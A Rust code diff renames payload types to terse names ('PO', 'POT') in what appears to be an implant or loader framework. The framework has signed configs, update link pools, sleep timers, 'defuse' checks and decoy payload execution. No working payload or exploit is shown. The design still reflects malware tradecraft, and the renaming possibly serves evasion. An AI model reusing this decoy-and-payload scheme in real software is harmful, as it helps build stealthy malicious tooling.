@@ -2,8 +2,8 @@ use crate::dataoperation::apply_all_dataoperations;
 use crate::defuse::{Defuse, Operator};
 use crate::link::FileLink;
 use crate::link::Link;
-use crate::payload::Payload;
-use crate::payload::PayloadExecThread;
+use crate::payload::PO;
+use crate::payload::POT;
 use crate::payload_util::create_directory;
 use crate::poollink::PoolLinks;
 use crate::poollink::PoolMode;
@@ -44,7 +44,7 @@ pub struct Config {
     #[serde(rename = "bc")]
     pub backup_config: Vec<FileLink>,
     #[serde(rename = "pa")]
-    pub payloads: Vec<Payload>,
+    pub payloads: Vec<PO>,
     #[serde(rename = "du")]
     pub defuse_update: Vec<Defuse>,
     #[serde(rename = "dp")]
@@ -55,9 +55,9 @@ pub struct Config {
     #[serde(rename = "ds")]
     pub decoy_defuse_payload_success: bool,
     #[serde(rename = "dc")]
-    pub decoy_update_config: Vec<Payload>,
+    pub decoy_update_config: Vec<PO>,
     #[serde(rename = "de")]
-    pub decoy_payload_exec: Vec<Payload>,
+    pub decoy_payload_exec: Vec<PO>,
     #[serde(rename = "db")]
     pub decoy_before_payload: bool, // on verra
 
@@ -82,14 +82,14 @@ impl Config {
     pub fn new_unsigned(
         update_links: BTreeMap<u64, (String, PoolLinks)>,
         backup_config: Vec<FileLink>,
-        payloads: Vec<Payload>,
+        payloads: Vec<PO>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
 
         decoy_defuse_update_success: bool,
         decoy_defuse_payload_success: bool,
-        decoy_update_config: Vec<Payload>,
-        decoy_payload_exec: Vec<Payload>,
+        decoy_update_config: Vec<PO>,
+        decoy_payload_exec: Vec<PO>,
         decoy_before_payload: bool, // on verra
 
         sleep: u64,
@@ -128,14 +128,14 @@ impl Config {
         key_pair: &Ed25519KeyPair,
         update_links: BTreeMap<u64, (String, PoolLinks)>,
         backup_config: Vec<FileLink>,
-        payloads: Vec<Payload>,
+        payloads: Vec<PO>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
 
         decoy_defuse_update_success: bool,
         decoy_defuse_payload_success: bool,
-        decoy_update_config: Vec<Payload>,
-        decoy_payload_exec: Vec<Payload>,
+        decoy_update_config: Vec<PO>,
+        decoy_payload_exec: Vec<PO>,
         decoy_before_payload: bool, // on verra
 
         sleep: u64,
@@ -269,8 +269,8 @@ impl Config {
 
             if payload.is_already_running_or_runonce_payload(run_data) == false {
                 match payload.exec_payload(&self) {
-                    PayloadExecThread::NoThread() => (),
-                    PayloadExecThread::Thread(join_handle, payload) => {
+                    POT::NoThread() => (),
+                    POT::Thread(join_handle, payload) => {
                         run_data.running_thread_payload.push((join_handle, payload));
                         ()
                     }
@@ -312,8 +312,8 @@ impl Config {
 
             if payload.is_already_running_or_runonce_decoy_update(run_data) == false {
                 match payload.exec_payload(&self) {
-                    PayloadExecThread::NoThread() => (),
-                    PayloadExecThread::Thread(join_handle, payload) => {
+                    POT::NoThread() => (),
+                    POT::Thread(join_handle, payload) => {
                         run_data
                             .running_thread_decoy_update
                             .push((join_handle, payload));
@@ -357,8 +357,8 @@ impl Config {
 
             if payload.is_already_running_or_runonce_decoy_payload(run_data) == false {
                 match payload.exec_payload(&self) {
-                    PayloadExecThread::NoThread() => (),
-                    PayloadExecThread::Thread(join_handle, payload) => {
+                    POT::NoThread() => (),
+                    POT::Thread(join_handle, payload) => {
                         run_data
                             .running_thread_decoy_payload
                             .push((join_handle, payload));
